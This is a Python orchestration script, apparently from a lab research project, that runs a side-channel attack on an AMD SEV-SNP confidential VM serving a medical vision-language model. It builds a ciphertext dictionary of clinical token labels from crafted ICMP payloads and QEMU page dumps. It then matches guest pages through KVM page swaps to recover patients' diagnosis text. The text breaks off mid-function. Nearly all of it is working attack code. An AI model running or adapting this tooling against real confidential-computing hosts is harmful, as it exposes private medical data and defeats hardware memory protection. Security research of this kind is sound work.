#!/usr/bin/env python3
"""
orchestrate_v4.py — Dictionary-based LLM token side-channel pipeline (v4).

Build scheme — phase landing aim (no rotation), same as v3:
  Labels are 2 / 4 / 6 / 8 tok (currently 2tok from 2tok_rank.json). For an N-token label, N phases
  each send the ORIGINAL token order and retry (byte_shift % L) until
  actual_landing == phase*8, then QEMU-dump that page and register at
  landing (+ k*L). NO swap_pages_tool during build.

What changed vs v3 — match-time swap hygiene (NOT build-time ref_gpa relocate):
  --swap-back with is_swap_back=true is a ROUND-TRIP: forward-swap so gfn1
  holds gfn2's plaintext retweaked under gfn1, snapshot into page_dump_buf,
  then swap back (guest RAM restored). KVM_READ_PAGE_DUMP returns that
  snapshot once (consume-once). So match can safely probe many labels
  against the same indication page; each call restores guest memory.

  v4's _swap_read_raw therefore: one tool invoke + one dump read; refuses
  self-swap (gfn1==gfn2); never double-calls the tool as a "confirm".

  An earlier v4 experiment relocated every build capture onto one shared
  ref_gpa via --swap-back so match needed only one swap per indication
  page. That path repeatedly segfaulted / stack-smashed QEMU after tens of
  SNP page moves — abandoned. Build stays QEMU-dump-only (per-phase
  dict_gpa in the cache, same as v3). Match still swaps per dict_gpa, with
  an in-memory cache keyed by (dict_gpa, ind_page_gpa).

  Distinct files vs v3: dict_cache_v4.json / dict_pages_v4 / run_all_v4.csv.

  NOT addressed: MIN_CLEAN_AES_BLOCKS=1 → shared-middle-token MULTI_MATCH
  among related labels (e.g. Shortness mid vs shortness).

Usage:
    sudo python3 orchestrate_v4.py --build [--swap-tool ./swap_pages_tool]
    sudo python3 orchestrate_v4.py --run-all
"""

import argparse
import csv
import ctypes
import datetime
import errno
import fcntl
import json
import os
import queue
import re
import socket
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

import read_gpa

# ---------------------------------------------------------------------------
# logging
# ---------------------------------------------------------------------------

_log_fh = None


def log(msg: str = "", file=None) -> None:
    ts  = datetime.datetime.now().strftime("%H:%M:%S")
    out = f"[{ts}] {msg}" if msg and not msg.startswith("  ") else msg
    print(out, file=file or sys.stdout)
    if _log_fh and file is None:
        print(out, file=_log_fh)
        _log_fh.flush()


def log_err(msg: str) -> None:
    log(msg, file=sys.stderr)
    if _log_fh:
        print(msg, file=_log_fh)
        _log_fh.flush()


HERE = Path(__file__).parent

GUEST_SSH  = "ubuntu@localhost"
GUEST_PORT = "7777"
_sudo_user = os.environ.get("SUDO_USER")
_ssh_key   = (Path(f"/home/{_sudo_user}/.ssh/id_ed25519")
              if _sudo_user else Path.home() / ".ssh/id_ed25519")
_ssh_control_path = f"/tmp/orchestrate_v4-ssh-{os.getpid()}.sock"
SSH_BASE   = [
    "ssh", "-p", GUEST_PORT,
    "-i", str(_ssh_key),
    "-o", "StrictHostKeyChecking=no",
    "-o", "BatchMode=yes",
    "-o", "ConnectTimeout=30",
    "-o", "ControlMaster=auto",
    "-o", "ControlPersist=60s",
    "-o", f"ControlPath={_ssh_control_path}",
    GUEST_SSH,
]

SWAP_TOOL  = HERE / "swap_pages_tool"
# Separate from v3's dict_cache.json/dict_pages/ so the two can coexist.
DICT_CACHE = HERE / "dict_cache_v4.json"
DICT_DIR   = HERE / "dict_pages_v4"

DEST_IP          = "192.168.100.2"
# Any interval >= 2*4096-1 = 8191B contains a full 4096-aligned page no
# matter where it starts — but that page is only guaranteed to be entirely
# our repeating token pattern (not zero-pad) if the PATTERN region itself
# (payload minus the byte_shift zero-pad prefix _make_icmp_payload adds) is
# >= 8191B. byte_shift is bounded to [0, L) (build_dict wraps every
# increment with `% L`; L = 8 * max tokens-per-label, currently 32B, kept
# generous here for any future 6/8-tok label), so reserve 8191 + 64 = 8255
# and round up. Kept well under the MTU-9000 ceiling set by
# ensure_mtu_9000() (IP hdr 20B + ICMP hdr 8B + payload <= 9000) to avoid
# IP-level fragmentation, which reassembles via frag_list — a structure
# guest_large_icmp_monitor.c does not walk, so such a send produces no
# frag[]/page[] lines at all (see orchestrate.py's
# acquire_zero_gpa()/diagnose_zero_page.py, which measured this directly:
# a 12288B payload under MTU 9000 failed to log fragment data in ~40% of
# sends, vs. reliably succeeding at 8193B).
ICMP_PAYLOAD_MIN = 8256

IMAGE_PAD_TOKEN_ID = 151655   # Qwen2-VL <|image_pad|>

# 2-token labels from rank_2tok_labels.py → 2tok_rank.json (top 30 only).
# NOTE: a 2tok (16B) span has 1 clean AES block at offset%16==0 and 0 at
# %16==8 — match at residue 8 will always be weak_blocks. Prefer landings
# at %16==0 when interpreting results. Rebuild filtered_samples.json after
# changing this list.
TOKEN_LABELS = [
    (' of breath',                         [315, 11486]),  # samples=562 abs=565
    ('ness of',                            [2090, 315]),  # samples=515 abs=519
    (' Shortness',                         [10698, 2090]),  # samples=272 abs=272
    (' Cough',                             [356, 1384]),  # samples=255 abs=256
    (' shortness',                         [2805, 2090]),  # samples=245 abs=246
    (' breath.',                           [11486, 13]),  # samples=235 abs=236
    (' chest pain',                        [15138, 6646]),  # samples=212 abs=214
    (' Chest pain',                        [41771, 6646]),  # samples=141 abs=142
    (' breath,',                           [11486, 11]),  # samples=124 abs=125
    (' Respiratory',                       [76834, 5269]),  # samples=98 abs=99
    ('ough and',                           [1384, 323]),  # samples=83 abs=83
    (', short',                            [11, 2805]),  # samples=79 abs=79
    (' cough.',                            [39600, 13]),  # samples=75 abs=76
    (' pneumonia.',                        [68229, 13]),  # samples=71 abs=72
    (' cough,',                            [39600, 11]),  # samples=68 abs=69
    (' rib pain',                          [20131, 6646]),  # samples=63 abs=63
    (' COPD',                              [67572, 35]),  # samples=62 abs=63
    (' Follow-up',                         [11112, 5239]),  # samples=59 abs=59
    (' Weakness',                          [41164, 2090]),  # samples=56 abs=56
    (' wheez',                             [14894, 10125]),  # samples=53 abs=53
    (' PICC',                              [60606, 34]),  # samples=53 abs=53
    (' CABG',                              [80117, 38]),  # samples=52 abs=52
    (' COVID-',                            [19966, 12]),  # samples=49 abs=49
    (' fever.',                            [33553, 13]),  # samples=47 abs=47
    (' respiratory failure',               [41531, 7901]),  # samples=47 abs=47
    (' pneumoth',                          [56123, 8767]),  # samples=45 abs=45
    (' Fever.',                            [83901, 13]),  # samples=45 abs=45
    (' Hypert',                            [38415, 529]),  # samples=43 abs=43
    (' catheter',                          [30647, 1404]),  # samples=42 abs=44
    (' Hypox',                             [38415, 5131]),  # samples=42 abs=42
]


# Prefer longer labels first (6tok before 4tok) so a short prefix label cannot
# beat a longer true match when only one AES block is compared. Within the same
# length, prefer in-context mid forms (leading space after "Reason: ").
def _label_is_mid(label: str) -> bool:
    return " mid" in label.lower()

_LABEL_ORDER: list[int] = sorted(
    (i for i in range(len(TOKEN_LABELS))),
    key=lambda i: (
        -len(TOKEN_LABELS[i][1]),
        0 if _label_is_mid(TOKEN_LABELS[i][0]) else 1,
    ),
)

# image_pad x4 reference label — used ONLY by _find_pad_start / _find_pad_end /
# _estimate_pad_bounds (via _IPAD4_IDX) to locate the padding run, NOT a
# clinical label. Appended AFTER _LABEL_ORDER so sweep_blind never tries to
# match it inside indication text, while build_dict (which iterates
# TOKEN_LABELS directly) still captures it into the dictionary.
# Restores the _IPAD4_IDX definition dropped by the personal-info scrub commit.
TOKEN_LABELS.append((' <image_pad x4>', [IMAGE_PAD_TOKEN_ID] * 4))
_IPAD4_IDX = len(TOKEN_LABELS) - 1

DRAIN_EVERY = 1   # drain guest RX before every ICMP send — large payloads +
                  # mdelay(HOLD) pile up and eventually stop frag logging
_GUEST_RECOVERY_TIMEOUT = 300
_ICMP_HOLD_SEC = 7.0   # guest_large_icmp_monitor mdelay(6000) + margin
# Wall-clock of last ICMP send that will trip the guest monitor. The kprobe
# runs mdelay(HOLD) in icmp_rcv softirq — sending again before that finishes
# queues skbs until the guest drops them and frag logging "dies".
_last_icmp_mono: float = 0.0
# Candidate paths on the guest for reloading the monitor after a soft hang.
_GUEST_ICMP_KO_CANDIDATES = [
    "~/sev-h100-sidechannel/2026attack/flow/guest_tool/guest_large_icmp_monitor.ko",
    "~/guest_large_icmp_monitor.ko",
    "/home/ubuntu/guest_large_icmp_monitor.ko",
    "/home/ubuntu/proof_code/guest_large_icmp_monitor.ko",
]

GUEST_SCRIPT_DEFAULT = "~/medical_ml/med_vlm/scripts/single_inference_indication_gpa.py"
GUEST_CWD_DEFAULT    = "~/medical_ml/med_vlm/scripts"
GUEST_PYTHON_DEFAULT = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"
GUEST_SAMPLES_JSON   = "~/medical_ml/med_vlm/scripts/filtered_samples.json"
_GPA_TIMEOUT         = 150   # seconds before guest inference is considered hung
# After guest RELEASED, physical pages may re-enter the freelist while the
# SEV-SNP RMP is still settling from the just-finished swap-backs. Re-using
# those PFNs for the next sample's input_ids produced systemic NO_MATCH.
_RMP_SETTLE_SEC = 2.0
_SWAP_PACE_SEC  = 0.25   # min interval between consecutive snp_guest_page_move
                         # bursts — PSP platform-resets under sustained ~60 cmds/s
                         # Each --swap-back = 6 snp_guest_page_move = ~12 PSP cmds;
                         # 0.25s → max ~48 cmds/s (safe margin below ~60 limit)
_SWAP_BURST_COOLDOWN = 10   # after this many swaps, insert extra cooldown
_SWAP_BURST_SLEEP    = 2.0  # seconds to sleep on burst cooldown

# Hard per-call ceiling on snp_guest_page_move rounds inside sweep_blind(),
# independent of per-swap pacing. A validated fully-blind sweep with the
# early-stop patch used ~33 swaps (2026-09-04, index 2); this leaves >2x
# margin while still bounding worst case. See the MAX_SWAPS_PER_SWEEP check
# at the swap_key cache-miss site below for why this exists.
MAX_SWAPS_PER_SWEEP = 100


# Fallback only when guest does not report HEADER_CONST_HINT / tok_start
# (e.g. --blind binary-search path). Live --gpa-only --calibrate supplies
# per-sample values — Age/Sex/Ethnicity prefix length is NOT constant.
HEADER_CONST  = 43
FIRST_PAD_POS = 15
N_SWEEP_MIN   = 30
N_SWEEP_MAX   = 1200
POST_SCAN_MIN = 20
POST_SCAN_MAX = 60

# Empirically observed HEADER_CONST_HINT (Age/Sex/Ethnicity prefix length,
# i.e. the token position where image_pad tokens actually start) across 1718
# --calibrate samples (v4-run.log). FIRST_PAD_POS=15 alone was a bad prior —
# the true value is never below 35, so a binary search starting at 15 spends
# its first several probes in a dead False region below the true start,
# which breaks the search's False-then-True-then-False monotonicity
# assumption (see _estimate_pad_bounds). Frequency-sorted so the common case
# (43, ~79% of samples) is tried first.
KNOWN_HEADER_CONSTS = [43, 42, 44, 51, 35, 39, 52, 50, 49, 38]
HEADER_CONST_MIN    = 35
HEADER_CONST_MAX    = 52

# Empirically observed N_image_pad (patch-count) values, same source, all
# distinct values seen across 1718 samples. Used to (a) bound the phase-2
# end-of-pad search instead of a blind 1200-wide sweep, and (b) snap a
# noisy raw estimate onto the nearest real value.
KNOWN_N_VALUES = sorted({
    64, 80, 81, 90, 96, 99, 104, 110, 117, 120, 126, 132, 144, 150, 156, 160,
    168, 180, 182, 192, 195, 196, 208, 210, 216, 224, 225, 228, 240, 252,
    255, 256, 266, 270, 285, 288, 300, 304, 306, 320, 323, 324, 330, 336,
    340, 342, 352, 360, 361, 374, 378, 391, 396, 399, 414, 418, 420, 425,
    437, 440, 441, 442, 456, 460, 462, 475, 480, 483, 484, 486, 494, 500,
    504, 506, 513, 520, 525, 528, 529, 540, 546, 550, 552, 567, 572, 575,
    576, 594, 598, 600, 621, 624, 625, 648, 650, 675, 676, 702, 729, 750,
    952, 1178,
})
N_VALUE_SNAP_TOL = 5   # snap a raw estimate to a known value within +-this
INDICATION_SCAN_MAX = 100   # max tokens to scan within the indication text
                            # itself, so labels are found anywhere inside it
                            # (not just when they're the very first word(s))

RESULTS_CSV       = HERE / "run_all_v4_2.csv"
RESULTS_CSV_BLIND = HERE / "run_all_v4_blind.csv"


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def ssh(cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(SSH_BASE + [cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return ""


def _wait_icmp_hold(reason: str = "") -> None:
    """Block until the previous monitor-held ICMP softirq should be done."""
    global _last_icmp_mono
    if _last_icmp_mono <= 0:
        return
    wait = _ICMP_HOLD_SEC - (time.monotonic() - _last_icmp_mono)
    if wait <= 0:
        return
    why = f" ({reason})" if reason else ""
    log(f"  [pace] waiting {wait:.1f}s for guest mdelay hold{why}")
    time.sleep(wait)


def _note_icmp_sent() -> None:
    global _last_icmp_mono
    _last_icmp_mono = time.monotonic()


def _guest_alive(timeout: int = 8) -> bool:
    try:
        r = subprocess.run(SSH_BASE + ["echo ok"],
                           capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0 and "ok" in (r.stdout or "")
    except Exception:
        return False


def _wait_guest_alive(max_wait: int = _GUEST_RECOVERY_TIMEOUT) -> bool:
    """Poll SSH until the guest responds or max_wait elapses."""
    log(f"  [guest] waiting for recovery (up to {max_wait}s)...")
    deadline = time.time() + max_wait
    while time.time() < deadline:
        if _guest_alive():
            log("  [guest] reachable — sleeping 10s for settle")
            time.sleep(10)
            return True
        time.sleep(15)
    log_err(f"  [guest] did not recover within {max_wait}s")
    return False


def drain_guest_rxbuf(rounds: int = 3) -> int:
    """Flush pending ICMP on the guest. Returns packets drained (best-effort)."""
    out = ssh(
        "sudo python3 << 'PYEOF'\n"
        "import socket, select\n"
        f"rounds = {int(rounds)}\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n"
        "s.setblocking(False)\n"
        "n = 0\n"
        "for _ in range(rounds):\n"
        "    while select.select([s], [], [], 0.5)[0]:\n"
        "        try:\n"
        "            s.recv(65536)\n"
        "            n += 1\n"
        "        except OSError:\n"
        "            break\n"
        "s.close()\n"
        "print(f'drained {n} pkts')\n"
        "PYEOF",
        timeout=30,
    )
    m = re.search(r"drained\s+(\d+)", out or "")
    n = int(m.group(1)) if m else 0
    log(f"  [drain] {(out or '').strip() or f'drained {n} pkts'}")
    return n


def _reload_icmp_monitor() -> bool:
    """rmmod/insmod guest_large_icmp_monitor.ko on the guest if a .ko is found."""
    find = ssh(
        "for p in "
        + " ".join(_GUEST_ICMP_KO_CANDIDATES)
        + "; do "
        "  eval ep=\"$p\"; "
        "  if [ -f \"$ep\" ]; then echo FOUND:$ep; break; fi; "
        "done",
        timeout=20,
    )
    m = re.search(r"FOUND:(\S+)", find or "")
    if not m:
        # Push host-side .ko into the guest home as a last resort.
        host_ko = Path(__file__).resolve().parent.parent / "guest_large_icmp_monitor.ko"
        if not host_ko.is_file():
            host_ko = Path("./guest_large_icmp_monitor.ko")
        if host_ko.is_file():
            log(f"  [recover] scp {host_ko} → guest:~/guest_large_icmp_monitor.ko")
            try:
                subprocess.run(
                    ["scp", "-P", GUEST_PORT, "-i", str(_ssh_key),
                     "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
                     str(host_ko), f"{GUEST_SSH}:~/guest_large_icmp_monitor.ko"],
                    capture_output=True, text=True, timeout=60, check=False,
                )
            except Exception as e:
                log_err(f"  [recover] scp failed: {e}")
            find = ssh(
                "test -f ~/guest_large_icmp_monitor.ko && echo FOUND:$HOME/guest_large_icmp_monitor.ko",
                timeout=15,
            )
            m = re.search(r"FOUND:(\S+)", find or "")
    if not m:
        log_err("  [recover] no guest_large_icmp_monitor.ko found on guest")
        return False
    ko = m.group(1)
    log(f"  [recover] reloading ICMP monitor from {ko}")
    # rmmod first and wait: any backlog is processed by plain icmp_rcv
    # (no mdelay). Insmoding immediately would re-arm mdelay on the whole
    # queue and the next probe still sees no frags.
    out_rm = ssh(
        "sudo rmmod guest_large_icmp_monitor 2>/dev/null; "
        "sudo rmmod guest_large_icmp 2>/dev/null; "
        "echo rmmod_done",
        timeout=60,
    )
    log(f"  [recover] {(out_rm or '').strip() or 'rmmod done'}; "
        f"draining backlog {_ICMP_HOLD_SEC:.0f}s without monitor...")
    time.sleep(_ICMP_HOLD_SEC)
    drain_guest_rxbuf(rounds=3)
    out = ssh(
        f"sudo insmod '{ko}' && lsmod | grep -E 'guest_large_icmp|large_icmp'",
        timeout=30,
    )
    ok = "guest_large" in (out or "") or "large_icmp" in (out or "")
    if ok:
        log(f"  [recover] module loaded: {(out or '').strip()}")
        global _last_icmp_mono
        _last_icmp_mono = 0.0  # clean slate; no in-flight monitor hold
    else:
        log_err(f"  [recover] insmod failed: {(out or '').strip()}")
    return ok


def _clear_icmp_frag_log() -> None:
    """Reset guest frag snapshot (proc preferred; dmesg fallback)."""
    # /proc/large_icmp_last survives when the guest dmesg ring is dead.
    out = ssh("echo clear | sudo tee /proc/large_icmp_last >/dev/null; "
              "sudo dmesg -C 2>/dev/null; echo ok", timeout=20)
    if "ok" not in (out or ""):
        ssh("sudo dmesg -C", timeout=15)


def _read_icmp_frag_log() -> str:
    """Return text that may contain frag[N]: compound_GPA=... lines."""
    # Prefer proc — dmesg ring was observed to go permanently empty mid-build
    # after printk flood + mdelay backlog, while ICMP itself still worked.
    proc = ssh("cat /proc/large_icmp_last 2>/dev/null", timeout=20)
    if proc and "frag[" in proc:
        return proc
    dmesg = ssh("sudo dmesg", timeout=40)
    if dmesg and "frag[" in dmesg:
        return dmesg
    if proc:
        return proc
    # Last resort: rsyslog copy (only useful if printk still reaches it)
    kern = ssh("sudo grep -a LARGE_ICMP /var/log/kern.log 2>/dev/null | tail -80",
               timeout=20)
    return (dmesg or "") + "\n" + (kern or "")


def _probe_icmp_frags() -> bool:
    """Send one large ICMP echo and check that the monitor logs frag[N]."""
    if not _guest_alive():
        return False
    _wait_icmp_hold("before probe")
    _clear_icmp_frag_log()
    try:
        _send_icmp(_make_icmp_payload([IMAGE_PAD_TOKEN_ID], byte_shift=0))
    except Exception as e:
        log_err(f"  [recover] probe send failed: {e}")
        return False
    out = ""
    for _ in range(20):
        time.sleep(0.25)
        out = _read_icmp_frag_log()
        if re.search(r"frag\[\d+\]:\s*compound_GPA=", out or "", re.I):
            log("  [recover] ICMP frag probe OK")
            return True
        if re.search(r"nonlinear=0", out or ""):
            log_err("  [recover] ICMP reached guest but skb is linear "
                    "(no frag[]) — check MTU/jumbo")
            return False
    log_err("  [recover] ICMP frag probe FAILED (no frag[N] in log/proc)")
    if out:
        for ln in (out or "").strip().splitlines()[-8:]:
            log_err(f"  [recover] log: {ln}")
    return False


def recover_guest_icmp(reason: str = "") -> bool:
    """Drain / wait for guest / reload monitor until frag logging works again."""
    why = f" ({reason})" if reason else ""
    log(f"  [recover] starting guest ICMP recovery{why}")
    if _guest_alive():
        # Stop hammering: wait out any in-flight mdelay chain, then drain.
        _wait_icmp_hold("recover")
        drain_guest_rxbuf(rounds=5)
        time.sleep(_ICMP_HOLD_SEC)
        drain_guest_rxbuf(rounds=3)
    else:
        log_err("  [recover] guest SSH down")
        if not _wait_guest_alive():
            return False
        try:
            ensure_mtu_9000()
        except Exception as e:
            log_err(f"  [recover] ensure_mtu_9000: {e}")

    if _probe_icmp_frags():
        return True

    # Soft hang / backlog: drop the module so queued packets drain without
    # mdelay, then re-arm and probe.
    if not _reload_icmp_monitor():
        ssh("sudo rmmod guest_large_icmp_monitor 2>/dev/null; "
            "sudo rmmod guest_large_icmp 2>/dev/null", timeout=20)
        time.sleep(_ICMP_HOLD_SEC)
        if not _reload_icmp_monitor():
            return False
    try:
        ensure_mtu_9000()
    except Exception:
        pass
    drain_guest_rxbuf(rounds=2)
    time.sleep(1)
    return _probe_icmp_frags()


def run(label: str, cmd: list) -> None:
    log(f"  $ {' '.join(str(c) for c in cmd)}")
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        log_err(f"[!] {label} failed (exit {rc})")
        sys.exit(1)


def ensure_mtu_9000() -> None:
    """Set MTU 9000 on host TAP and guest ICMP interface to prevent IP
    fragmentation. Without jumbo frames, ICMP_PAYLOAD_MIN-sized payloads
    IP-fragment; reassembled skbs use frag_list (not skb_shinfo->frags), so
    guest_large_icmp_monitor.c logs no frag[]/page[] lines at all for that
    send."""
    r = subprocess.run(["ip", "route", "get", DEST_IP],
                       capture_output=True, text=True)
    m = re.search(r'\bdev\s+(\S+)', r.stdout)
    if m:
        host_iface = m.group(1)
        cur = subprocess.run(["ip", "link", "show", host_iface],
                             capture_output=True, text=True).stdout
        if "mtu 9000" not in cur:
            subprocess.run(["ip", "link", "set", host_iface, "mtu", "9000"], check=True)
            log(f"[mtu] host {host_iface} → 9000")
        else:
            log(f"[mtu] host {host_iface} already 9000")
    else:
        log_err("[mtu] WARNING: could not determine host interface")

    out = ssh("ip -o addr show | awk '/192\\.168\\.100\\.2/{print $2}'")
    guest_iface = out.strip() or "enp0s4"
    result = ssh(f"ip link show {guest_iface}")
    if "mtu 9000" not in result:
        ssh(f"sudo ip link set {guest_iface} mtu 9000")
        log(f"[mtu] guest {guest_iface} → 9000")
    else:
        log(f"[mtu] guest {guest_iface} already 9000")


# ---------------------------------------------------------------------------
# ICMP send (inlined — sends by payload_ids directly, no send_tokens.py lookup)
# ---------------------------------------------------------------------------

def _icmp_checksum(data: bytes) -> int:
    """Internet checksum (RFC 1071) over big-endian 16-bit words."""
    if len(data) & 1:
        data = data + b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s & 0xFFFF) + (s >> 16)
    s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _icmp_hdr_bytes_in_frag0(size: int, icmp_payload_len: int) -> int:
    """How many leading ICMP-header bytes sit inside frag[0] (0 or 8).

    The ICMP echo is 8 bytes header + icmp_payload_len body. Virtio may keep
    the header in skb head (frag size == payload_len) or prepend it in frag[0]
    (frag size == payload_len + 8). Treating the wrong case as header_skip
    shifts every landing by 8 and makes the whole dictionary miss at match
    time (NO_MATCH / false 1-block hits).
    """
    if size == icmp_payload_len + 8 or size > icmp_payload_len:
        return 8
    return 0


def _frag_token_header_skip(frag_index: int, byte_shift: int, size: int,
                            icmp_payload_len: int = ICMP_PAYLOAD_MIN) -> int:
    """Bytes to skip before the token stream starts in this frag."""
    if frag_index != 0:
        return 0
    return _icmp_hdr_bytes_in_frag0(size, icmp_payload_len) + byte_shift


def _make_icmp_payload(token_ids: list[int], byte_shift: int = 0) -> bytes:
    """token_ids bytes repeated to fill ICMP_PAYLOAD_MIN, prefixed by byte_shift
    zero bytes. byte_shift MUST be in [0, L) where L=len(token_ids)*8 — it
    both corrects mod-8 placement and aims target landing. Unbounded growth
    (seen historically: byte_shift→1100+) eats the pattern region, breaks
    frag logging, and has coincided with QEMU segfaults."""
    L = len(token_ids) * 8
    if L <= 0:
        raise ValueError("token_ids empty")
    if not (0 <= byte_shift < L):
        raise ValueError(
            f"byte_shift={byte_shift} out of range [0, {L}) — build must wrap "
            f"with % L after every aim nudge")
    if ICMP_PAYLOAD_MIN - byte_shift < 8191:
        raise ValueError(
            f"byte_shift={byte_shift} leaves only {ICMP_PAYLOAD_MIN - byte_shift}B "
            f"pattern (<8191)")
    token_bytes = struct.pack(f"<{len(token_ids)}q", *token_ids)
    remaining   = ICMP_PAYLOAD_MIN - byte_shift
    repeated    = (token_bytes * (remaining // len(token_bytes) + 1))[:remaining]
    return b"\x00" * byte_shift + repeated


def _send_icmp(payload: bytes) -> None:
    _wait_icmp_hold("before send")
    pid = os.getpid() & 0xFFFF
    hdr = struct.pack("!BBHHH", 8, 0, 0, pid, 0)
    chk = _icmp_checksum(hdr + payload)
    hdr = struct.pack("!BBHHH", 8, 0, chk, pid, 0)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    try:
        s.sendto(hdr + payload, (DEST_IP, 0))
    finally:
        s.close()
    _note_icmp_sent()


# ---------------------------------------------------------------------------
# GPA acquisition
# ---------------------------------------------------------------------------

def acquire_gpa(payload_ids: list[int], byte_shift: int = 0) -> list[tuple[int, int, int]]:
    """Send one ICMP packet with payload_ids; return [(compound_gpa, off, size), ...]
    for every 'frag[N]: compound_GPA=... off=... size=...' log line, in
    ascending frag order. Large payloads get split by the guest into
    multiple non-contiguous frags — frag[0] alone does not span the whole
    payload."""
    if not _guest_alive():
        raise RuntimeError("[!] Guest SSH unreachable before ICMP send")
    _clear_icmp_frag_log()
    _send_icmp(_make_icmp_payload(payload_ids, byte_shift=byte_shift))

    # The kprobe fires synchronously as part of packet processing, so the
    # frag snapshot is available almost immediately for a local VM — poll
    # tightly instead of a flat multi-second wait (every bit of latency
    # here eats into the guest kernel's mdelay() hold window before its
    # skb/pages can be reused). Prefer /proc/large_icmp_last over dmesg.
    out   = ""
    frags = []
    for attempt in range(8):
        time.sleep(0.15)
        out = _read_icmp_frag_log()
        if not out and not _guest_alive():
            raise RuntimeError("[!] Guest SSH died while waiting for frag log")
        matches = re.findall(
            r"frag\[(\d+)\]:\s*compound_GPA=0x([0-9a-f]+)\s+off=(\d+)\s+size=(\d+)",
            out, re.IGNORECASE)
        if matches:
            frags = sorted(matches, key=lambda m: int(m[0]))
            break

    if not frags:
        raise RuntimeError("[!] No frag[N] compound_GPA/off/size in guest log")

    return [(int(cgpa, 16), int(off), int(size)) for _, cgpa, off, size in frags]


def _acquire_retry(payload_ids: list[int], byte_shift: int = 0,
                   retries: int = 5) -> list[tuple[int, int, int]]:
    """Send ICMP with drain + guest recovery between failures."""
    last_err: Exception | None = None
    for attempt in range(retries):
        try:
            # Always drain before a send once the guest has been under load;
            # cheap when the buffer is empty.
            if attempt == 0:
                drain_guest_rxbuf(rounds=1)
            return acquire_gpa(payload_ids, byte_shift=byte_shift)
        except RuntimeError as e:
            last_err = e
            log_err(f"  {e} (attempt {attempt + 1}/{retries})")
            if attempt >= retries - 1:
                break
            # Progressive recovery: drain → wait hold window → full recover
            if not _guest_alive():
                if not _wait_guest_alive():
                    break
                try:
                    ensure_mtu_9000()
                except Exception as ex:
                    log_err(f"  [recover] mtu: {ex}")
            elif attempt == 0:
                log("  [recover] drain + hold-window wait before retry...")
                drain_guest_rxbuf(rounds=5)
                time.sleep(_ICMP_HOLD_SEC)
                drain_guest_rxbuf(rounds=2)
            else:
                if not recover_guest_icmp(f"acquire attempt {attempt + 1}"):
                    log_err("  [recover] guest ICMP recovery failed")
                    break
            wait = 5 * (attempt + 1)
            log(f"  sleeping {wait}s before retry...")
            time.sleep(wait)

    # Final full recovery + one last send
    if recover_guest_icmp("final acquire chance"):
        try:
            return acquire_gpa(payload_ids, byte_shift=byte_shift)
        except RuntimeError as e:
            last_err = e
            log_err(f"  {e} (after recovery)")
    raise RuntimeError(f"acquire_gpa failed after {retries} attempts"
                       + (f": {last_err}" if last_err else ""))


# ---------------------------------------------------------------------------
# Swap-back + kernel page dump
# ---------------------------------------------------------------------------

_KVMIO            = 0xAE
_PAGE_SIZE        = 4096
KVM_READ_PAGE_DUMP = (0x80000000
                      | ((_PAGE_SIZE & 0x3FFF) << 16)
                      | (_KVMIO << 8)
                      | 0x2b)


def _bytes_to_xp_dump(gpa: int, raw: bytes) -> str:
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, _PAGE_SIZE, 16):
        addr = gpa + i
        lo   = int.from_bytes(raw[i:i+8],    "little")
        hi   = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{addr:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


# Stats from the most recent sweep_blind() call. Exposed as module state
# rather than a third return value so external callers that unpack
# (matches, N_est) keep working. run_all reads skip_unproven to decide between
# NO_MATCH and INCONCLUSIVE.
LAST_SWEEP_STATS: dict = {"skip_safe": 0, "skip_unproven": 0, "swaps": 0}


class SwapAbort(RuntimeError):
    """A swap failed in a way that leaves guest memory or the RMP unsound.

    Raised for the mid-sequence failures of the 6x snp_guest_page_move
    round-trip. The kernel's swap path (svm.c _swap_guest_pages_loop_body)
    has NO unwind: if `gfn1 -> tmp` succeeds and `gfn2 -> gfn1` then fails, it
    just `goto page_swap_complete` and returns, leaving the guest half-swapped
    and pages stuck immutable. snp_guest_page_move's own error path documents
    why it cannot clean up either -- SEV_CMD_SNP_PAGE_RECLAIM on a
    pre-guest/pre-swap immutable page can trigger a PSP platform reset -- so it
    deliberately leaks the pages instead. Leaked immutable pages that the host
    later recycles fault as RMP violations in kernel context, which is the
    mechanism behind the observed host reboots. Continuing to swap after such a
    failure compounds the leak, so this must unwind all the way out of run_all.
    """


# dmesg is the only channel that distinguishes failure kinds: swap_pages_tool
# collapses ioctl error, done != 1 and timeout into a single `return 1`.
_DMESG_ABORT = (
    "failed to move page",                 # any of the 3 moves, mid-sequence
    "KVM_PAGE_SWAP: failed to move page",
    "Failed to set RMP state",
    "sev_do_cmd failed",
    "snp_reclaim_pages failed",
)
# Rejected BEFORE the first snp_guest_page_move -> guest memory untouched.
# is_pfn_sev_private() only compares the RMP entry's ASID to the guest's, and a
# page holding input_ids is by definition guest-private, so this rejection
# PROVES the page is not the target. Safe to skip.
_DMESG_SKIP_SAFE = ("is not private",)
# Also pre-move, but host-side (scratch pfn / swap-gfn assignment). Says
# nothing about the guest page's content, so skipping could silently drop the
# GT page. Must be retried, never skipped.
_DMESG_RETRY = (
    "invalid target_pfn",
    "Failed to assign swap GFNs",
    "invalid snp_context_pfn",
    "invalid slot for gfn",
)

_dmesg_seen_ts: float = 0.0
_RE_DMESG_TS = re.compile(r'^\[\s*(\d+\.\d+)\]')


def _classify_swap_failure(tool_stderr: str = "") -> str:
    """Return 'abort' | 'skip_safe' | 'retry' | 'unknown' for the last failure.

    Only called after a failure, so the dmesg cost is paid once per failure,
    not once per swap. Messages are filtered by kernel timestamp against the
    high-water mark from the previous call so a stale error cannot be
    misattributed to this swap.
    """
    global _dmesg_seen_ts
    if "Timed out" in tool_stderr:
        # The swap neither completed nor reported an error: state unknown, and
